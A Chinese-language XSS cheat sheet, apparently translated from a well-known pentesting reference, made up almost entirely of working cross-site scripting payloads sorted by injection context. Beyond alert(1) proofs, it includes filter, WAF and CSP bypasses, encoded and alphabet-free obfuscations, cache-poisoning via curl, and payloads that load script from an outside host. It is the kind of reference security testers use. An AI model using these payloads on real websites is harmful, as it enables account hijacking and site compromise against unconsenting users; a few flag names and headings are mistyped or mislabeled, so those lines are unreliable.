# XSS Cheat Sheet中文

## HTML注入

**当输入内容落在HTML标签的属性值内或标签外部（除了后面描述的情况）时使用。如果内容落在HTML注释中，请在Payload前添加`-->`**

```
<svg onload=alert(1)>
"><svg onload=alert(1)>
```



## HTML注入 - 标签块突破

**当输入落在以下标签的内部或开始/结束标签之间时使用：`<title><style><script><textarea><noscript><pre><xmp>`和`<iframe>(</tag>)`相对应处理**

```javascript
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
```



## HTML注入 - 内联

**当输入落在HTML标签的属性值中且无法通过(>)终止标签时使用**

```javascript
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
```



## HTML注入 - 源

**当输入作为以下HTML标签属性值时使用：`href`，`src`，`data `或 `action`（包括 `formation`）。在`<script>`标签中，`src`属性可以是URL或 `data:,alert(1)`**

```javascript
javascript:alert(1)
```



## Javascript - 注入

**当输入在`<script>`中，且位于字符串分隔符(' ")的值内时使用 **

```
'-alert(1)-'
'/alert(1)//
```



## Javascript注入 - 绕过

**当输入在`<script>`中，且位于字符串分隔符(' ")内，但引号被反斜杠转义时使用**

```
\'/alert(1)/
```



## Javascript注入 - script

**输入落在`<script>`中的任意位置使用**

```
</script><svg onload=alert(1)>
```



## Javascript注入 - 逻辑块

**输入落在`<script>`代码块中，且位于字符串分隔(' ")的值内，并处于单个逻辑块（if，else，etc）中时，使用第一个或第二个payload。如果引号被反斜杠转义，则使用第三个payload**

```
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
```



## Javascript注入 - 无引号

**当同一行Javascript代码中存在多重反射时使用。第一个payload用在简单的Javascript变量，第二个适用在非嵌套的Javascript对象**

```
/alert(1)//\
/alert(1)}//\
```



## Javascript上下文 - 模板字符串中的占位符注入

**输入落在反引号(~)分隔的字符串中或在模板引擎中时，使用占位符注入技术**

```
${alert(1)}
```



## 多重反射HTML注入 - 双重反射（单一输入）

**利用同一网页上的多重反射（即同一输入在页面的多个位置被反射）来实现攻击**

```JavaScript
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```



## 多重反射HTML注入 - 三重反射（单一输入）

**利用同一网页上的多重反射（即同一输入在页面的多个位置被反射）来实现攻击**

```javascript
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```



## 多重反射HTML注入 - 双重与三重反射

**利用同一网页上的多重反射（即同一输入在页面的多个位置被反射）来实现攻击**

```javascript
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
```



## 文件上传注入 - 文件名

**当上传的文件名在目标页面的某个位置被反射时使用**

```javascript
"><svg onload=alert(1)>.gif
```



## 文件上传注入 - 元数据

**当上传文件的元数据在目标网页某个位置被反射时使用。此技术利用命令行工具`exiftool`($ 是终端提示符)，`exiftool`可以设置任何元数据字段**

```
$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
```



## 文件上传注入 - SVG文件

**用于在上传图片文件时在目标网站上创建存储型XSS。将下面payload保存为`xss.svg`文件**

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```



## DOM 插入注入

**用于当注入内容作为有效标记插入到DOM中（而不是在源码中反射）时的XSS，此方法使用于`<script>`标签和其他常见向量无效的情况**

```javascript
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
```



## DOM 插入注入 - 资源请求

**用于测试原生Javascript代码将某个URL请求的结果插入到页面中，而该URL可以被攻击者控制时使用**

```javascript
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```



## PHP Self URL注入

**用于当目标网站的底层PHP代码将当前URL用作HTML表单的属性值（例如`action`或`src`）时。通过PHP扩展名和查询部分（?）之间注入一个斜杠（/）来触发漏洞**

```javascript
https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
```



## Markdown Vector

**用于允许部分标记输入（如Markdown）的文本框、评论区等场景。点击即可触发**

```
[clickme](javascript:alert`1`)
```



## Script 注入 - 无闭合标签

**用于当代码中反射点之后存在闭合的`</script>`标签时。通过注入不完整的`<script>`标签来触发漏洞**

```javascript
<script src=data:,alert(1)>
<script src=//brutelogic.com.br/1.js>
```



## Javscript postMessage() DOM注入（使用Iframe）

**用于当`Javascript`代码中存在未检查来源的`message`事件监听器（如`window.addEventListener('message', ...)`）时。目标页面必须能够被嵌入到`iframe`中（根据上下文检查`X-Frame-Options`头）。保存为HTML文件（或使用`data:text/html`），并提供`TARGET_URL`和`INJECTION`（XSS向量或Payload）   **

**攻击原理：攻击者通过创建一个包含目标页面的 iframe，并使用 `postMessage()` 向目标页面发送恶意消息。由于目标页面未验证消息的来源，恶意消息会被处理并执行注入的 XSS payload。**

```
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
```



## XML XSS

**用于XML页面（内容类型为`text/xml`或`application/xml`）中注入XSS向量。如果输入位于注释部分，则在payload前添加`-->`；如果输入位于`CDATA`部分，则在payload前添加`]]>` **

```javascript
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
```



## AngularJS 注入（v1.6 及以上版本）

**用于当页面中加载了`AngularJS `库，并且存在带有`ng-app`指令的HTML块时（用第一个`payload`），创建自己的`Angular JS`应用（使用第二个payload）**

```javascript
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
```



## Onscroll 通用攻击方法

**用于在无需用户交互的情况下触发`XSS`，利用`onscroll`事件处理程序，它适用于以下`HTML`标签 ：` address`, `blockquote`, `body`, `center`, `dir`, `div`, `dl`, `dt`, `form`, `li`, `menu`, `ol`, `p`, `pre`, `ul`, 以及 `h1` 到 `h6 **

```javascript
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
```



## Type Juggling

**用于在松散比较（比如PHP中的==）中通过`if`条件匹配一个数字**

```javascript
1<svg onload=alert(1)>
1"><svg onload=alert(1)>
```



## Xss in SSI

**用于存在`Server-Side Include(SSI)`注入的场景**

```javascript
<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
```



## SQLi Error-Based XSS

**用于可以触发SQL错误消息的端点（通过单引号或反斜杠）**

```javascript
'1<svg onload=alert(1)>
<svg onload=alert(1)>\
```



## JSP 路径注入

**在基于`JSP`的应用程序中，利用`URL`路径进行攻击**

```javascript
//DOMAIN/PATH/;<svg onload=alert(1)>
//DOMAIN/PATH/;"><svg onload=alert(1)>
```



## JS 注入 - ReferenceError Fix

**用于修复某些未完成的`JavaScript`代码的语法。在浏览器的开发者工具（按F12）中检查`Console`标签页，找到相对应的`ReferenceError`，并替换变量和函数名称以修复问题**

```javascript
';alert(1);var myObj='
';alert(1);function myFunc(){}'
```



## Bootstrap 攻击方法（适用V3.4.0 及以下版本）

**当页面存在Bootstrap库时使用。它还可以绕过`Webkit Auditor` ，只需点击网页任意位置即可触发。`herf`值的任何字符都可以进行`HTML`编码以绕过过滤器 **

```javascript
<html data-toggle=tab href="<img src=x onerror=alert(1)>">
```



## 浏览器通知

**作为`alert`、`prompt`和 `confirm`弹窗的替代方案。它需要用户授权（第一次请求），但如果用户之前已经为该网站授权过，则可以直接使用二次请求  **

```javascript
Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)
```



## HTTP header XSS -  缓存

**用于通过使用`MISS-MISS-HIT`缓存方案（如果存在）将XSS攻击存储在应用程序中。将`<XSS>`替换为你的攻击payload，并将`TARGET`替换为一个虚拟字符串，以避免实际缓存的页面版本。重复发送相同的请求3次  **

```javascript
$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
```



## 混合大小写

**用于绕过大小写敏感的过滤器。**

```javascript
<Svg OnLoad=alert(1)>
<Script>alert(1)</Script>
```



## 未闭合的标签

**未闭合的标签是一种用于`HTML注入`的技术 ，通过避免使用完整的`<`和 `>`符号来绕过某些过滤器。这种技术依赖于在源代码中，输入payload后存在一个原生的`>`符号  **

```javascript
<svg onload=alert(1)//
<svg onload="alert(1)"
```



## 大写XSS

**当应用程序将输入转换为大写时使用。在URL中将`&`替换为`%26`，将`#`替换为`%23` **

```javascript
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
```



## 脚本标签的额外内容

**当过滤器检测`<script>`或 `<script src=...`及其变体，但未检查其他非必需属性时使用 **

```javascript
<script/x>alert(1)</script>
```



## 双重编码 XSS

**当应用程序对输入进行双重解码时使用**

```
%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
```



## 无括号的Alert(仅限字符串)

**在HTML攻击或Javascript注入中使用，当不允许使用括号且简单的警告框足够时**

```
alert`1`
```



## 无括号的Alert

**在HTML攻击或Javascript注入中使用，当不允许使用括号且POC（概念验证）需要返回目标信息时使用**

```javascript
setTimeout`alert\x28document.domain\x29`
setInterval`alert\x28document.domain\x29`
```



## 无括号的HTML实体

**仅在HTML注入中使用，当不允许使用括号时。在URL中将`&`替换为`%26`，将`#`替换为`%23`**

```
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#40;1&#41>
```



## 无字母字符的alert

**当不允许使用字母字符时使用。以下是 alert(1)。**

```javascript
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
('\141\154\145\162\164\50\61\51')()
```



## alert混淆

**用于绕过多个正则表达式（regex）过滤器。它可以与之前提到的替代方法（上文）结合使用。最短的选项`top`也可以根据上下文替换为`window`，`parent`，`self`，或`this` **

```javascript
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
```



## Alert替代方法 - Write和Wrieln

**作为alert、prompt和 confirm替代方法使用。如果在HTML标签中使用，可以直接使用，单如果时JavaScript注入，则需要完整的`document.write`形式**

```javascript
write`XSSed!`
write`<img/src/o&#78error=alert&lpar;1)&gt;`
write('\74img/src/o\156error\75alert\501\51\76')
```



## Alert替代方法 - Open伪协议

**作为`alert`、`prompt`和`confirm`的替代方法使用，上文提到的技巧同样适用于此。在`Chromium`的浏览器中，第二个方法有效，并且需要`<iframe name=0>`  **

```javascript
top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0
```



## Alert替代方法 - Eval + URL

**作为调用`alert`、`prompt`和`confirm`的替代方法使用。第一个payload是原始形式，而第二个payload则用HTML元素的`id`属性值来动态替换`eval`。代码需要放在URL的两个位置之一：要么在PHP扩展后的URL路径中（FILE.php/后面），或URL的片段中（即#后面）。URL中的加号（+）必须进行编码 **

```javascript
<svg onload=eval(" ' "+URL)>
<svg id=eval onload=top[id](" ' "+URL)>
    
PoC URL 必须包含以下内容之一：
=> FILE.php/'/alert(1)//?...
=> #'/alert(1)
```





## Alert替代方法 - Eval + URL 于模板字符串

```javascript
${alert(1)}<svg onload=eval('`//'+URL)>
```



## HTML注入 - 内联代替方法

```javascript
"onpointerover=alert(1) //
"autofocus onfocusin=alert(1) //
```



## 基于Strip-Tags的绕过方法

**当过滤器移除`<`和`>`之间的所有内容时（例如PHP的`strip_rags()`函数），使用此方法。仅限内联注入  **

```javascript
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```



## 文件上传注入 - 伪装成HTML/JS的GIF文件

**同于通过文件上传绕过CSP（内容安全策略）。将以下所有内容保存为`xss.gif`或`xss.js`（用于严格的MIME类型检查）。可以通过`<link rel=import href=xss.gif>(或xss.js)或<script src=xss.js></script>`导入到目标页面。对于PHP，它时`image/gif`类型 **

```javascript
GIF89a=//<script>
alert(1)//</script>;
```



## 跳转到URL片段

**当需要隐藏某些可能触发WAF（Web应用防火墙）的字符时使用。它利用`URL`片段(`#`)后的有效payload格式**

```javascript
eval(URL.slice(-8)) #alert(1)
eval(location.hash.slice(1)) #alert(1)
document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
```



## 二阶 xss注入

**当你的输入会被使用两次时使用，例如先被存储并规范化到数据库中，随后被检索用于后续使用或插入到DOM中**

```javascript
&lt;svg/onload&equals;alert(1)&gt;
```



## PHP拼写检查绕过

**用于绕过PHP的`pspell_new`函数，该函数提供了一个字典来尝试猜测用户输入的搜索内容。这是一种类似于Google的`您是不是要找`功能，用于搜索字段 **

```javascript
<scrpt> confirm(1) </scrpt>
```



## postMessage() 事件源绕过

**当目标`Javascript`代码中的源检查可以通过将允许的源作为攻击域的子域前缀来绕过时使用。示例利用`CrossPwn`脚本（在Extra部分中提供）在local host上实现 **

```javascript
http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=<script>alert(1)</script>
```



## CSP 绕过（针对白名单中的 Google 域名）

**当存在允许从某些域名执行脚本的 CSP（内容安全策略）时使用。**

```javascript
<script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)>
</script>
<script src=//www.googleapis.com/customsearch/v1?callback=alert(1)></script>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
```



## 带有事件处理程序的 SVG 矢量图

**在 Firefox 中有效，但在 `<set>` 中添加 `attributename=x` 也可以使其在基于 Chromium 的浏览器中工作。`<set>` 也可以替换为 `<animate>`。用于绕过黑名单。**

```javascript
<svg><set onbegin=alert(1)>
<svg><set end=1 onend=alert(1)>
```



## 不带事件处理程序的 SVG 矢量图

**用于避免过滤器检测事件处理程序或 `src`、`data` 等属性。最后一个示例仅适用于 Firefox，并且已经进行了 URL 编码。**

```javascript
<svg><a><rect width=99% height=99% /><animate attributeName=href
to=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href
values=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href to=0
from=javascript:alert(1)>
<svg><use xlink:href=data:image/svg
%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAv
c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI
%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp
hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
```





## 无交互事件payload

**如果没有事件，可以使用下面payload来进行代替，不过有些payload需要与用户交互**

```javascript
<script>alert(1)</script>
<script src=data:,alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click 
```



## 交互事件payload

**当所有已知的 HTML 标签名称都不允许使用时，可以使用以下 payload。任何字母字符或字符串都可以用来替代“x”作为标签名称。这些 payload 需要用户交互，正如它们的文本内容所描述的那样（这也是 payload 的一部分）。**

```javascript
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x onauxclick=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmouseenter=alert(1)>hover this
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<x onpointercancel=alert(1)>hover this!
<x onpointerdown=alert(1)>hover this!
<x onpointerenter=alert(1)>hover this!
<x onpointerleave=alert(1)>hover this!
<x onpointermove=alert(1)>hover this!
<x onpointerout=alert(1)>hover this!
<x onpointerover=alert(1)>hover this!
<x onpointerup=alert(1)>hover this!
<x onpointerrawupdate=alert(1)>hover this!
```



## 混合上下文反射实体绕过

**用于将脚本中被过滤的输入内容转换为实际有效的`javascript`代码。它需要在`HTML`和`JavaScript`上下文依次运行，并且彼此接近。`<svg>`标签会使下一个脚本会被以某种方法解析，即使单引号（'）在运行过程中被编码为`&#39;`或`&apos;`（经过清理），它任然可以有效跳出当前值并触发`alert`。以下是针对`javascript`场景的 payload，分别适用于：单引号被清理、单引号被完全转义、双引号被清理或完全转义 **

```javascript
">'-alert(1)-'<svg>
">&#39-alert(1)-&#39<svg>
">alert(1)-"<svg>
"&#34>alert(1)-&#34<svg>
```



## 绕过清除script的payload

**用于那些删除script的过滤器，即使删除`<script>`标签，它依然可以实现攻击**

```javascript
<svg/on<script><script>load=alert(1)//</script>
```



## Javascript代替注释

**当常规Javascript注释（如//）不被允许、被转义或移除时使用**

```javascript
<!--
%0A-->
```



## JavaScript 小写输入

**当目标应用程序通过`Javascript`将你的输入转换为小写时使用。它也可能适用于服务器端的小写操作。  **

```javascript
<SCRİPT>alert(1)</SCRİPT>
<SCRİPT/SRC=data:,alert(1)>
```



## 超长 UTF-8 编码

**当目标应用程序执行最佳拟合映射时使用**

- 最佳拟合映射”是一种字符编码转换策略。当目标应用程序需要将一种字符编码（如 UTF-8）转换为另一种字符编码（如 ASCII）时，如果目标字符集不支持某些字符，应用程序会尝试将这些字符映射到最接近的有效字符。如：字符 `é`（Unicode 值为 `U+00E9`）在 ASCII 字符集中不存在。如果应用程序执行最佳拟合映射，它可能会将 `é` 映射到 `e`。

```javascript
%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
```



## 专用于 ASP 页面的攻击payload

**用于绕过 ASP 页面中的 `<[alpha]` 过滤。**

```javascript
%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)>
%uFF1Csvg onload=alert(3)>
```



## PHP邮箱验证绕过

**用于绕过PHP的`filter_var()`函数中的`FILER_VALIDATE_EMAIL`标签 **

```javascript
"><svg/onload=alert(1)>"@x.y
```



## PHP URL 验证绕过

**用于绕过PHP的`filter_var()`函数中的`FILTER_VALIDATE_EMAIL`标志  **

```javascript
javascript://%250Aalert(1)
```



## PHP URL验证绕过 -- 需要查询参数

**用于绕过 PHP 的 `filter_var()` 函数中结合 `FILTER_FLAG_QUERY_REQUIRED` 标志的 `FILTER_VALIDATE_EMAIL` 验证。**

```javascript
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

(with domain filter)
javascript://https://DOMAIN/%250A1?alert(1):0
```



## 通过服务器端反射实现 DOM 插入

**当输入出现在页面源代码但无法直接执行时，通过将其插入到DOM中来绕过浏览器过滤和WAF**

```javascript
\74svg o\156load\75alert\501\51\76 
```



## 基本XML的绕过 bypass

**用于在XML页面中绕过浏览器过滤和WAF。如果输入内容位于注释部分，则在payload前添加`-->`；如果输入内容位于`CDATA`部分，则在有效payload前添加`]]>` **

```javascript
<_:script xmlns:_="http://www.w3.org/1999/xhtml">alert(1)</_:script>
```



## Javascript 上下文 - 代码注入

**用于在将代码注入到javascript上下文时，绕过`Microsoft IE11`或`Edge`浏览器的安全机制  **

```javascript
';onerror=alert;throw 1//
```



## HTML上下文 - 标签注入(IE11/Edge XSS绕过)

**用于在多反射场景中绕过其原生过滤器**

```javascript
"'>confirm&lpar;1)</Script><Svg><Script/1=' 
```



## JavaScript 伪协议混淆

**用于绕过检测`javascript:alert(1)`的过滤器。确保在添加`alert(1)`之前，`1`能够通过过滤器，因为这种有效载荷可能需要额外的混淆才能完全绕过过滤器。最后一种方法仅适用于通过`DOM`操作处理payload的情况（例如基于位置的payload或DOM型XSS）。请确保在`URL`中正确编码它们  **

```javascript
javas&#99ript:1
javascript&colon;1
javascript&#9:1
&#1javascript:1
"javas%0Dcript:1"
%00javascript:1
```

